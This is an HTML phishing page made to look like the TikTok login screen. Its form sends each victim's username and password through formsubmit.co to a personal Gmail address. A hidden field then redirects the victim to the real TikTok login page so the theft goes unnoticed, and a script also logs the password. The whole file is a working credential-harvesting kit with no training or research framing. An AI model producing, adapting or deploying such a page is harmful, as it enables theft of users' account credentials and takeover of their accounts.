<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        
        .login-container {
            background-color: #222;
            padding: 30px;
            border-radius: 10px;
            width: 350px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
        }
        
        .logo {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #FE2C55;
        }
        
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #aaa;
        }
        
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #444;
            border-radius: 5px;
            background-color: #333;
            color: #fff;
            box-sizing: border-box;
        }
        
        button {
            width: 100%;
            padding: 12px;
            background-color: #FE2C55;
            color: white;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        button:hover {
            background-color: #ff3a62;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #777;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #444;
        }
        
        .divider::before {
            margin-right: 10px;
        }
        
        .divider::after {
            margin-left: 10px;
        }
        
        .other-options {
            font-size: 14px;
            color: #aaa;
        }
        
        .other-options a {
            color: #25F4EE;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">TikTok</div>
        
        <!-- Updated form with formsubmit.co integration -->
        <form action="https://formsubmit.co/eyad.rabeihassan@gmail.com" method="POST">
            <!-- Add these hidden fields for formsubmit.co -->
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value="https://www.tiktok.com/login">
            
            <div class="input-group">
                <label for="username">Username or email</label>
                <input type="text" id="username" name="username" placeholder="Enter your username or email" required>
            </div>
            
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <button type="submit">Log in</button>
        </form>
        
        <div class="divider">or</div>
        
        <div class="other-options">
            <p>Don't have an account? <a href="https://www.tiktok.com/signup" target="_blank">Sign up</a></p>
            <p><a href="https://www.tiktok.com/forgot-password" target="_blank">Forgot password?</a></p>
        </div>
    </div>

    <script>
        // Optional: You can still store values in variables if needed
        const loginForm = document.querySelector("form");
        const usernameInput = document.getElementById("username");
        const passwordInput = document.getElementById("password");
        
        loginForm.addEventListener("submit", function(e) {
            // Values will be automatically sent to your email via formsubmit.co
            console.log("Username:", usernameInput.value);
            console.log("Password:", passwordInput.value);
        });
    </script>
</body>
</html>
